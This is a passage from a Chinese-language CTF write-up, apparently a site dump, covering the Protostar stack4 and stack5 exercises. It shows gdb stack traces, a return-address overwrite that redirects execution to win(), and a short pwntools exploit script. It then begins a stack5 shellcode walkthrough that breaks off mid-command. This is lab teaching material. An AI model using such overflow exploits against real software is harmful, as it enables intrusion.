<pre><code>\u00a0Breakpoint 5, main (argc=1, argv=0xffffd064) at stack4/stack4.c:15 15 in stack4/stack4.c (gdb) i r eax 0x8048408 134513672 ecx 0x89ae3a96 -1985070442 edx 0xffffcfd0 -12336 ebx 0xf7e1dff4 -136192012 esp 0xffffcf50 0xffffcf50 ebp 0xffffcfa8 0xffffcfa8 esi 0x8048430 134513712 edi 0xf7ffcba0 -134231136 eip 0x8048411 0x8048411 &lt;main+9&gt; eflags 0x286 [ PF SF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 (gdb) x/10i $eip =&gt; 0x8048411 &lt;main+9&gt;: lea eax,[esp+0x10] 0x8048415 &lt;main+13&gt;: mov DWORD PTR [esp],eax 0x8048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt; 0x804841d &lt;main+21&gt;: leave 0x804841e &lt;main+22&gt;: ret 0x804841f: nop 0x8048420 &lt;__libc_csu_fini&gt;: push ebp 0x8048421 &lt;__libc_csu_fini+1&gt;: mov ebp,esp 0x8048423 &lt;__libc_csu_fini+3&gt;: pop ebp 0x8048424 &lt;__libc_csu_fini+4&gt;: ret (gdb) x/20wx $esp 0xffffcf50: 0xf7ffcff4 0x0000000c 0x00000000 0xffffdfde 0xffffcf60: 0xf7fc8580 0x00000000 0xf7c1c9a2 0xf7e1e04c 0xffffcf70: 0xf7fc2400 0xf7fd9e8b 0xf7c1c9a2 0xf7fc2400 0xffffcf80: 0xffffcfc0 0xf7fc25d8 0xf7fc2aa0 0x00000001 0xffffcf90: 0x00000001 0x00000000 0x00000000 0x00000000 \n</code></pre> <p>\u00a06\u3001<code>mov DWORD PTR [esp],eax:</code>\u5c06eax\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u5b58\u50a8\u5230\u6808\u7684\u9876\u90e8\uff0c\u8fd9\u662f\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9<code>gets</code>\u51fd\u6570\u7684\u5730\u5740\u3002</p> <pre><code>(gdb) n\n\nBreakpoint 6, 0x08048415 in main (argc=1, argv=0xffffd064) at stack4/stack4.c:15\n15      in stack4/stack4.c\n(gdb) i r\neax            0xffffcf60          -12448\necx            0x89ae3a96          -1985070442\nedx            0xffffcfd0          -12336\nebx            0xf7e1dff4          -136192012\nesp            0xffffcf50          0xffffcf50\nebp            0xffffcfa8          0xffffcfa8\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x8048415           0x8048415 &lt;main+13&gt;\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax\n   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;\n   0x804841d &lt;main+21&gt;: leave\n   0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp\n   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp\n   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret\n   0x8048425:   lea    esi,[esi+eiz*1+0x0]\n(gdb) x/64wx $esp\n0xffffcf50:     0xf7ffcff4      0x0000000c      0x00000000      0xffffdfde\n0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c\n0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400\n0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001\n0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000\n0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5\n0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0\n0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064\n0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000\n0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000\n0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00\n0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888\n0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340\n0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4\n0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361\n0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430\n</code></pre> <p>7\u3001<code>call 0x804830c gets@plt:</code>\u8c03\u7528<code>gets</code>\u51fd\u6570\uff0c\u5b83\u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u8bfb\u53d6\u5b57\u7b26\u4e32\u5e76\u5c06\u5176\u5b58\u50a8\u5728\u4e4b\u524d\u5206\u914d\u7684\u5730\u5740\u4e2d\u3002\u7136\u800c\uff0c<code>gets</code>\u51fd\u6570\u662f\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u51fd\u6570\uff0c\u5bb9\u6613\u53d7\u5230\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u3002</p> <pre><code>(gdb) n\n\nBreakpoint 7, 0x08048418 in main (argc=1, argv=0xffffd064) at stack4/stack4.c:15\n15      in stack4/stack4.c\n(gdb) i r\neax            0xffffcf60          -12448\necx            0x89ae3a96          -1985070442\nedx            0xffffcfd0          -12336\nebx            0xf7e1dff4          -136192012\nesp            0xffffcf50          0xffffcf50\nebp            0xffffcfa8          0xffffcfa8\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x8048418           0x8048418 &lt;main+16&gt;\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;\n   0x804841d &lt;main+21&gt;: leave\n   0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp\n   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp\n   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret\n   0x8048425:   lea    esi,[esi+eiz*1+0x0]\n   0x8048429:   lea    edi,[edi+eiz*1+0x0]\n(gdb) x/64wx $esp\n0xffffcf50:     0xffffcf60      0x0000000c      0x00000000      0xffffdfde\n0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c\n0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400\n0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001\n0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000\n0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5\n0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0\n0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064\n0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000\n0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000\n0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00\n0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888\n0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340\n0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4\n0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361\n0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430\n</code></pre> <p>8\u3001<code>leave:</code>\u6062\u590d\u6808\u5e27\uff0c\u76f8\u5f53\u4e8e<code>mov esp, ebp</code> \u548c <code>pop ebp</code> \u7684\u7ec4\u5408\uff0c\u91ca\u653e\u6808\u7a7a\u95f4\u3002</p> <pre><code>(gdb) n\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa    \n\nBreakpoint 8, main (argc=1, argv=0xffffd064) at stack4/stack4.c:16\n16      in stack4/stack4.c\n(gdb) i r\neax            0xffffcf60          -12448\necx            0xf7e1f9c4          -136185404\nedx            0x0                 0\nebx            0xf7e1dff4          -136192012\nesp            0xffffcf50          0xffffcf50\nebp            0xffffcfa8          0xffffcfa8\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x804841d           0x804841d &lt;main+21&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x804841d &lt;main+21&gt;: leave\n   0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp\n   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp\n   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret\n   0x8048425:   lea    esi,[esi+eiz*1+0x0]\n   0x8048429:   lea    edi,[edi+eiz*1+0x0]\n   0x8048430 &lt;__libc_csu_init&gt;: push   ebp\n(gdb) x/64wx $esp\n0xffffcf50:     0xffffcf60      0x0000000c      0x00000000      0xffffdfde\n0xffffcf60:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffcf70:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffcf80:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffcf90:     0x61616161      0x61616161      0x61616161      0x61616161\n0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5\n0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0\n0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064\n0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000\n0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000\n0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00\n0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888\n0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340\n0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4\n0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361\n0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430\n&lt;/main+22&gt;&lt;/main+21&gt;&lt;/main+21&gt;\n</code></pre> <p>9\u3001<code>ret\uff1a</code>\u8fd4\u56de\uff0c\u7ed3\u675f\u51fd\u6570\u3002</p> <pre><code>(gdb) n\n\nBreakpoint 9, 0x0804841e in main (argc=&lt;error reading variable: Unknown argument list address for `argc'.&gt;, \n    argv=&lt;error reading variable: Unknown argument list address for `argv'.&gt;) at stack4/stack4.c:16\n16      in stack4/stack4.c\n(gdb) i r\neax            0xffffcf60          -12448\necx            0xf7e1f9c4          -136185404\nedx            0x0                 0\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfac          0xffffcfac\nebp            0x0                 0x0\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x804841e           0x804841e &lt;main+22&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp\n   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp\n   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret\n   0x8048425:   lea    esi,[esi+eiz*1+0x0]\n   0x8048429:   lea    edi,[edi+eiz*1+0x0]\n   0x8048430 &lt;__libc_csu_init&gt;: push   ebp\n   0x8048431 &lt;__libc_csu_init+1&gt;:       mov    ebp,esp\n(gdb) x/64wx $esp\n0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c\n0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001\n0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0\n0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000\n0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000\n0xffffcffc:     0x1d1faa00      0xf7ffda20      0xf7c23756      0xf7e1dff4\n0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001\n0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809\n0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000\n0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064\n0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c\n0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000\n0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297\n0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319\n0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372\n0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a\n</code></pre> <p>\u6267\u884c\u5b8c<code>ret</code>\u6307\u4ee4\u540e\uff0c\u518d\u6b21\u67e5\u770b\u76f8\u5e94\u53d8\u5316\uff0c\u53ef\u4ee5\u89c1\u5230\u5e76\u672a\u6267\u884cwin\u51fd\u6570\uff1b</p> <pre><code>(gdb) n\n__libc_start_call_main (main=main@entry=0x8048408 &lt;main&gt;, argc=argc@entry=1, argv=argv@entry=0xffffd064)\n    at ../sysdeps/nptl/libc_start_call_main.h:74\n74      ../sysdeps/nptl/libc_start_call_main.h: No such file or directory.\n(gdb) i r\neax            0xffffcf60          -12448\necx            0xf7e1f9c4          -136185404\nedx            0x0                 0\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfc0          0xffffcfc0\nebp            0x0                 0x0\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0xf7c237c8          0xf7c237c8 &lt;__libc_start_call_main+120&gt;\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0xf7c237c8 &lt;__libc_start_call_main+120&gt;:     sub    esp,0xc\n   0xf7c237cb &lt;__libc_start_call_main+123&gt;:     push   eax\n   0xf7c237cc &lt;__libc_start_call_main+124&gt;:     call   0xf7c3c1a0 &lt;__GI_exit&gt;\n   0xf7c237d1 &lt;__libc_start_call_main+129&gt;:     call   0xf7c84320 &lt;__GI___nptl_deallocate_tsd&gt;\n   0xf7c237d6 &lt;__libc_start_call_main+134&gt;:     mov    eax,DWORD PTR [esp]\n   0xf7c237d9 &lt;__libc_start_call_main+137&gt;:     lock sub DWORD PTR [eax+0x124],0x1\n   0xf7c237e1 &lt;__libc_start_call_main+145&gt;:     je     0xf7c237fb &lt;__libc_start_call_main+171&gt;\n   0xf7c237e3 &lt;__libc_start_call_main+147&gt;:     mov    edx,0x1\n   0xf7c237e8 &lt;__libc_start_call_main+152&gt;:     xor    ebx,ebx\n   0xf7c237ea &lt;__libc_start_call_main+154&gt;:     lea    esi,[esi+0x0]\n(gdb) x/64wx $esp\n0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064\n0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000\n0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000\n0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00\n0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888\n0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340\n0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4\n0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361\n0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430\n0xffffd050:     0x08048420      0xf7fcecd0      0xffffd05c      0xf7ffda20\n0xffffd060:     0x00000001      0xffffd237      0x00000000      0xffffd251\n0xffffd070:     0xffffd260      0xffffd274      0xffffd297      0xffffd2cd\n0xffffd080:     0xffffd2ee      0xffffd2fb      0xffffd319      0xffffd335\n0xffffd090:     0xffffd351      0xffffd361      0xffffd372      0xffffd37c\n0xffffd0a0:     0xffffd389      0xffffd3a8      0xffffd44a      0xffffd468\n0xffffd0b0:     0xffffd483      0xffffd49a      0xffffd4ad      0xffffd4cb\n</code></pre> <p>\u5206\u6790\uff1a</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5728<code>call 0x804830c &lt;gets@plt&gt;</code>,\u7a0b\u5e8f\u9700\u8981\u6211\u4eec\u7684\u8f93\u5165\uff0c\u4e8e\u662f\u6211\u4eec\u8f93\u5165\u8f93\u5165\u4e86\u957f\u5ea6\u4e3a64\u7684\u2018a\u2019,\u5373\u2018a\u2019*64;</p> <p>\u7136\u540e\u6211\u4eec\u89c2\u5bdf\u8f93\u5165\u540e\u7684\u6808\u7ed3\u6784\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u4f46\u662f\u4ece\u6700\u540e\u7684\u7ed3\u679c\u6765\u770b\uff0c\u957f\u5ea6\u4e3a64\u5e76\u6ca1\u6709\u6210\u529f\u6ea2\u51fa\u8df3\u8f6c\u5230win\u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u7ee7\u7eed\u5f80\u4e0b\u770b\uff0c\u5bfb\u627eret\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u5230\uff0c\u5373\u5c06\u6267\u884c\u7684<code>ret</code>\u7684\u5b58\u50a8\u7684\u8fd4\u56de\u5730\u5740\u5c31\u662f\u6b64\u523b\u4f4d\u4e8e\u6808\u9876\u7684<code>0xf7c237c5</code></p> <p>\u90a3\u4e48\uff0c\u6211\u4eec\u7684\u76ee\u6807\u5c31\u662f\uff1a\u8f93\u5165\u8db3\u591f\u7684\u957f\u5ea6\uff0c\u8986\u76d6\u5230<code>0xf7c237c5</code>\u4e3a\u6b62</p> <p></p> <p>\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u586b\u5145(3\u7ec4)x(\u6bcf\u7ec44\u5b57\u8282)=\uff08\u4e00\u517112\u5b57\u8282\uff09\u7684\u957f\u5ea6\uff0c\u624d\u80fd\u8fbe\u5230\u8fd4\u56de\u5730\u5740\u524d\uff0c\u7136\u540e\u518d\u7528\u76ee\u6807\u5730\u5740\u8986\u76d6\u539f\u6765\u7684\u8fd4\u56de\u5730\u5740</p> <p>\u6211\u4eec\u7684\u76ee\u6807\u5730\u5740\u5e94\u5f53\u662fwin\u51fd\u6570\u7684\u5730\u5740\uff0c\u5982\u4e0b\uff1awin\u51fd\u6570\u5730\u5740\u4e3a<code>0x80483f4</code></p> <pre><code>(gdb) print win\n$7 = {void (void)} 0x80483f4 &lt;win&gt;\n</code></pre> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u6267\u884cret\u524d\u505a\u4e00\u4e0b\u6d4b\u8bd5\uff0c\u7528set\u547d\u4ee4\u76f4\u63a5\u4fee\u6539<code>0xf7c237c5</code>\u4e3a<code>0x80483f4</code>\uff0c\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <pre><code>(gdb) n\n\nBreakpoint 9, 0x0804841e in main (argc=&lt;error reading variable: Unknown argument list address for `argc'.&gt;, \n    argv=&lt;error reading variable: Unknown argument list address for `argv'.&gt;) at stack4/stack4.c:16\n16      in stack4/stack4.c\n(gdb) i r\neax            0xffffcf60          -12448\necx            0xf7e1f9c4          -136185404\nedx            0x0                 0\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfac          0xffffcfac\nebp            0x0                 0x0\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x804841e           0x804841e &lt;main+22&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x804841e &lt;main+22&gt;: ret\n   0x804841f:   nop\n   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp\n   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp\n   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp\n   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret\n   0x8048425:   lea    esi,[esi+eiz*1+0x0]\n   0x8048429:   lea    edi,[edi+eiz*1+0x0]\n   0x8048430 &lt;__libc_csu_init&gt;: push   ebp\n   0x8048431 &lt;__libc_csu_init+1&gt;:       mov    ebp,esp\n(gdb) x/64wx $esp\n0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c\n0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001\n0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0\n0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000\n0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000\n0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4\n0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001\n0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809\n0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000\n0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064\n0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c\n0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000\n0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297\n0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319\n0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372\n0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a\n(gdb) set *0xffffcfac=0x80483f4\n(gdb) x/64wx $esp\n0xffffcfac:     0x080483f4      0x00000001      0xffffd064      0xffffd06c\n0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001\n0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0\n0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000\n0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000\n0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4\n0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001\n0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809\n0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000\n0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064\n0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c\n0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000\n0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297\n0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319\n0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372\n0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a\n(gdb) n\nwin () at stack4/stack4.c:7\n7       in stack4/stack4.c\n(gdb) i r\neax            0xffffcf60          -12448\necx            0xf7e1f9c4          -136185404\nedx            0x0                 0\nebx            0xf7e1dff4          -136192012\nesp            0xffffcfb0          0xffffcfb0\nebp            0x0                 0x0\nesi            0x8048430           134513712\nedi            0xf7ffcba0          -134231136\neip            0x80483f4           0x80483f4 &lt;win&gt;\neflags         0x246               [ PF ZF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/10i $eip\n=&gt; 0x80483f4 &lt;win&gt;:     push   ebp\n   0x80483f5 &lt;win+1&gt;:   mov    ebp,esp\n   0x80483f7 &lt;win+3&gt;:   sub    esp,0x18\n   0x80483fa &lt;win+6&gt;:   mov    DWORD PTR [esp],0x80484e0\n   0x8048401 &lt;win+13&gt;:  call   0x804832c &lt;puts@plt&gt;\n   0x8048406 &lt;win+18&gt;:  leave\n   0x8048407 &lt;win+19&gt;:  ret\n   0x8048408 &lt;main&gt;:    push   ebp\n   0x8048409 &lt;main+1&gt;:  mov    ebp,esp\n   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0\n(gdb) n\nwin () at stack4/stack4.c:8\n8       in stack4/stack4.c\n(gdb) n\ncode flow successfully changed\n9       in stack4/stack4.c\n</code></pre> <p>\u4ece\u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u6267\u884cret\u6307\u4ee4\u524d\uff0c\u6211\u4eec\u5c06\u4f4d\u4e8e\u6808\u9876\u7684\u8fd4\u56de\u5730\u5740 <code>0xf7c237c5</code>\u4fee\u6539\u4e3a<code>0x80483f4</code>\uff0c\u7136\u540e\u6210\u529f\u8df3\u8f6c\u5230\u4e86win\u51fd\u6570\u5e76\u8f93\u51fa\u4e86\u6211\u4eec\u7684\u671f\u671b\u76ee\u6807\uff1a<code>code flow successfully changed</code></p> <p>Exp\u5982\u4e0b\uff1a</p> <pre><code># -*- coding:utf-8 -*-\n\nfrom pwn import *\n\nsh = process(\"./stack4\")\n\nret_addr  = 0x80483f4\n\npayload  = b'a'*76\n\npayload += p32(ret_addr)\n\nsh.sendline(payload)\n\nprint(sh.recvline())\n</code></pre> <p>BinGo!!!</p> <p></p> <p> </p>"},{"location":"pwn/Protostar_stack5/","title":"Protostar stack5","text":"<pre><code>Stack5 is a standard buffer overflow, this time introducing shellcode.\n\nThis level is at /opt/protostar/bin/stack5\n\n**Hints**\n\n- At this point in time, it might be easier to use someone elses shellcode\n- If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger\n- remove the int3s once your shellcode is done.\n</code></pre>"},{"location":"pwn/Protostar_stack5/#source-code","title":"Source code:","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char **argv)\n{\n  char buffer[64];\n\n  gets(buffer);\n}\n</code></pre> <p>checksec:</p> <pre><code>\u2514\u2500$ checksec --file=stack5\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE\nNo RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67 Symbols        No    0               1               stack5\n</code></pre> <p>objdump:</p> <pre><code>\u2514\u2500$ objdump -t -j .text ./stack5\n\n./stack5:     file format elf32-i386\n\nSYMBOL TABLE:\n08048310 l    d  .text  00000000              .text\n08048340 l     F .text  00000000              __do_global_dtors_aux\n080483a0 l     F .text  00000000              frame_dummy\n08048450 l     F .text  00000000              __do_global_ctors_aux\n080483e0 g     F .text  00000005              __libc_csu_fini\n08048310 g     F .text  00000000              _start\n080483f0 g     F .text  0000005a              __libc_csu_init\n0804844a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx\n080483c4 g     F .text  00000017              main\n</code></pre>"},{"location":"pwn/Protostar_stack5/#_1","title":"\u67e5\u770b\u6c47\u7f16\u4ee3\u7801:","text":"<pre><code>gdb-peda$ file stack5\nReading symbols from stack5...\ngdb-peda$ disass main\nDump of assembler code for function main:\n   0x080483c4 &lt;+0&gt;:     push   ebp\n   0x080483c5 &lt;+1&gt;:     mov    ebp,esp\n   0x080483c7 &lt;+3&gt;:     and    esp,0xfffffff0\n   0x080483ca &lt;+6&gt;:     sub    esp,0x50\n   0x080483cd &lt;+9&gt;:     lea    eax,[esp+0x10]\n   0x080483d1 &lt;+13&gt;:    mov    DWORD PTR [esp],eax\n   0x080483d4 &lt;+16&gt;:    call   0x80482e8 &lt;gets@plt&gt;\n   0x080483d9 &lt;+21&gt;:    leave\n   0x080483da &lt;+22&gt;:    ret\nEnd of assembler dump.\n</code></pre>"},{"location":"pwn/Protostar_stack5/#_2","title":"\u8c03\u8bd5\u8fc7\u7a0b\u5982\u4e0b\uff1a","text":"<pre><code>\u2514\u2500$ gdb-peda\nSuccessfully imported six module\ngdb-peda$ file stack5\nReading symbols from stack5...\ngdb-peda$ pattern_create 